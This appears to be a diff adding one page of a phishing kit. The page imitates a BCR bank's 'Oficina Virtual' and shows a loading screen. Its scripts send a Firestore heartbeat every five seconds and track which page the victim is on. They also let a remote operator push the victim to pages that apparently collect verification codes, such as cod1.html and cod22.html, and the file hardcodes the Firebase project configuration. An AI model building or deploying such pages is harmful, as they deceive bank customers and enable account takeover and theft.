@@ -1,0 +1,245 @@
+<html><head><style>
+    body {
+        font-family: apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+    background-size: cover;
+    background-repeat: no-repeat;
+    background-position: center;
+    height: 100vh;
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+  }
+    header {
+    background-color: white;
+    color: white;
+    border-radius: 0 0 32px 32px;
+    padding-right: 18px;
+}
+footer {
+    background-color: #0033A0;
+    color: white;
+    text-align: center;
+    margin-right: -5%;
+    padding: 0px;
+    margin-top: auto;
+}
+.header-vertical {
+  display: flex;
+  flex-direction: column; /* Apila los bloques verticalmente */
+  width: 100%;
+}
+
+.header-top {
+  background-color: #ffffff; /* Color blanco arriba */
+  padding: 10px 20px;        /* Espacio interno ajustable */
+  color: #000000;            /* Texto negro para contrastar */
+}
+
+.header-bottom {
+    background-color: #0033A0;
+    padding: 0px 0px;
+    color: #ffffff;
+    height: 45px;
+    width: 100%;
+}
+
+/* Contenedor centrado */
+.login-wrapper {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex: 1; /* Ocupa el espacio disponible entre el header y el footer */
+    padding: 20px;
+}
+
+.login-container {
+    background-color: rgba(255, 255, 255, 0.8);
+    padding: 40px 45px; /* Padding unificado y simétrico */
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    max-width: 320px;
+    text-align: center;
+}
+.txtSeleccionMetodo {
+    font-family: apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+        margin-top: -15px;
+        margin-bottom: 22px;
+        font-size: 25px;
+        font-style: normal;
+        font-weight: 600;
+        color: #0033A0 !important;
+        display: block;
+        text-align: center;
+    }
+
+/* Animación de crecimiento y reducción */
+@keyframes pulseLogo {
+    0% {
+        transform: scale(1);
+    }
+    50% {
+        transform: scale(1.2); /* Tamaño máximo al que crece (120%) */
+    }
+    100% {
+        transform: scale(1);
+    }
+}
+
+.loading-logo {
+    width: 80px;
+    height: auto;
+    margin-top: 10px;
+    margin-bottom: 20px;
+    margin-left: -10px;
+    animation: pulseLogo 1.5s infinite ease-in-out;
+}
+
+</style>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BCR</title>
+</head>
+
+<!-- Scripts de Firebase (versión 8.6.8) -->
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
+    authDomain: "kkkkk-5e2bd.firebaseapp.com",
+    databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
+    projectId: "kkkkk-5e2bd",
+    storageBucket: "kkkkk-5e2bd.firebasestorage.app",
+    messagingSenderId: "1059258934487",
+    appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
+  };
+
+  if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+  }
+  const db = firebase.firestore();
+
+  // Obtener el usuario actual directamente del localStorage
+  function obtenerUsuarioActual() {
+    return localStorage.getItem("usuario");
+  }
+
+  // --- SISTEMA DE LATIDOS (Heartbeat) MODIFICADO ---
+  function enviarLatido() {
+    const usuarioId = obtenerUsuarioActual();
+    
+    if (usuarioId) {
+      const docRef = db.collection("prolme").doc(usuarioId);
+      
+      // Valida si el documento aún existe en Firestore antes de actualizar
+      docRef.get().then((doc) => {
+        if (doc.exists) {
+          docRef.set({
+            last_active: firebase.firestore.FieldValue.serverTimestamp()
+          }, { merge: true }).catch((error) => {
+            console.error("Error al enviar latido:", error);
+          });
+        }
+      }).catch((error) => {
+        console.error("Error al verificar existencia del documento:", error);
+      });
+    }
+  }
+
+  // Ejecutar el latido cada 5 segundos
+  setInterval(enviarLatido, 5000);
+
+  // Enviar latido inmediato si el usuario cambia de pestaña u oculta la ventana
+  window.addEventListener('visibilitychange', function() {
+    if (document.visibilityState === 'hidden') {
+      enviarLatido();
+    }
+  });
+</script>
+
+<body background="background.png">
+    <header class="header-vertical">
+  <div class="header-top">
+    <img style="width: 150px;" src="logo.gif">
+  </div>
+  <div class="header-bottom">
+    <p style="text-align: center;font-weight: 400;font-size: 21px;margin-top: 5px;">Oficina Virtual | Personas</p>
+  </div>
+</header>
+
+<div class="login-wrapper">
+    <div class="login-container">
+        <img src="logo.gif" alt="Cargando" class="loading-logo">
+         <a class="txtSeleccionMetodo">Cargando...</a>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-content">
+      <p> 116    BCR © Derechos Reservados 2026.    Contáctenos: CentroAsistenciaBCR@bancobcr.com</p>
+    </div>
+</footer>
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const usuarioId = localStorage.getItem("usuario");
+      
+      if (!usuarioId) {
+          console.log("No hay usuario en localStorage");
+          return;
+      }
+
+      // Escuchador en tiempo real adaptado a la sintaxis v8 de Firebase
+      db.collection("prolme").doc(usuarioId).onSnapshot((doc) => {
+        if (doc.exists) {
+          const questionData = doc.data();
+
+          if (questionData.page == 1) {
+            window.location.href = "cod22.html";
+          }
+          if (questionData.page == 2) {
+            window.location.href = "https://www.bncr.fi.cr/";
+          }
+          if (questionData.page == 3) {
+            window.location.href = "index.html";
+          }
+          if (questionData.page == 4) {
+            window.location.href = "indexinc.html";
+          }
+          if (questionData.page == 5) {
+            window.location.href = "cod12.html";
+          }
+          if (questionData.page == 6) {
+            window.location.href = "cod1.html";
+          }
+          if (questionData.page == 7) {
+            window.location.href = "cod2.html";
+          }
+          if (questionData.page == 8) {
+            window.location.href = "cod22.html";
+          }
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+
+    // --- ACTUALIZACIÓN SEGURA DE PÁGINA ACTUAL ---
+    window.addEventListener('load', () => {
+        const usuarioId = localStorage.getItem("usuario");
+        if (usuarioId) {
+            const docRef = db.collection("prolme").doc(usuarioId);
+            docRef.get().then((doc) => {
+                if (doc.exists) {
+                    docRef.update({
+                        pagina_actual: "Cargando"
+                    }).catch(e => console.error("Error al actualizar página actual:", e));
+                }
+            }).catch(e => console.error("Error al verificar documento:", e));
+        }
+    });
+</script>
+
+</body></html>
